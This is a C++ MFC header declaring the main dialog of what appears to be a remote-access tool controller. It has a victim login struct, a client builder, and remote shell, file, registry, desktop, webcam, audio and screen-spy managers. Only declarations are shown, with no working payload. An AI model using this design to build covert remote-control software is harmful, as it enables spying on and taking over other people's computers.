
// RemoteDlg.h : 头文件
//

#pragma once
#include "TrueColorToolBar.h"
#include "afxcmn.h"
#include "IOCPServer.h"
#include "SettingDlg.h"
#include "BuildDlg.h"

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

// CRemoteDlg 对话框

typedef struct  _LOGIN_INFOR
{
	BYTE			bToken;			// = 1    //登陆信息
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	DWORD			dwCPUMHz;	// CPU主频
	IN_ADDR			ClientAddr;		// 存储32位的IPv4的地址数据结构
	char			szPCName[MAX_PATH];	// 主机名
	BOOL			bWebCamIsExist;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
}LOGIN_INFOR, *PLOGIN_INFOR;
class CRemoteDlg : public CDialogEx
{
// 构造
public:
	CRemoteDlg(CWnd* pParent = NULL);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_REMOTE_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持
//函数
public:
	VOID CreateToolBar();
	VOID InitControl();
	VOID CreateStatusBar();
	VOID CreteNotifyBar();
	VOID CreateSolidMenu();
	VOID ListenPort();
	VOID Activate(INT iPort, INT iMaxConnection);
	VOID ShowMessage(BOOL bOk, CString strMsg);
	VOID AddList(CString strIP, CString strAddr,
		CString strPCName, CString strOS,
		CString strCPU, CString strVideo,
		CString strPing, CONTEXT_OBJECT* ContextObject);
	static VOID CALLBACK NotifyProc(CONTEXT_OBJECT* ContextObject);
	static VOID MessageHandle(CONTEXT_OBJECT* ContextObject);

	VOID SendSeletedCommand(PBYTE szBuffer, ULONG ulLength);
//成员变量
	CStatusBar m_StatusBar;
	NOTIFYICONDATA m_Nid;
	INT m_iCount;

	CBitmap m_bmOnline[2];


//变量
public:
	CTrueColorToolBar m_ToolBar;
// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnTimer(UINT_PTR nIDEvent);

	
	CListCtrl m_CList_Online;
	CListCtrl m_CList_Message;
protected:
	afx_msg LRESULT OnIconotify(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnNotifyExit();
	afx_msg void OnNotifyShow();
	afx_msg void OnMainSet();
	afx_msg void OnMainExit();
	afx_msg void OnClose();
	afx_msg void OnOnlineBuildClient();
protected:
//	afx_msg LRESULT OnUsertoonlinelist(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnUsertoonlinelist(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnOnlineProcess();
protected:
	afx_msg LRESULT OnOpensystemdialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineMessage();
protected:
	afx_msg LRESULT OnOpentalkdialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnOnlineDelete();
	afx_msg void OnOnlineCmd();
protected:
	afx_msg LRESULT OnOpenshelldialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnOnlineWindowManager();
	afx_msg void OnOnlineDesktopManager();
	afx_msg void OnOnlineFileManager();
protected:
	afx_msg LRESULT OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam);
public:
	
	afx_msg void OnOnlineAudioManager();
protected:
	afx_msg LRESULT OnOpenaudiodialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnOnlineVideoManager();
protected:
	afx_msg LRESULT OnOpenVideoDialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnOnlineServerManager();
protected:
	afx_msg LRESULT OnOpenServicesDialog(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnOnlineRegisterManager();
protected:
	afx_msg LRESULT OnOpenrRegisterDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenScreenspyDialog(WPARAM wParam, LPARAM lParam);
};
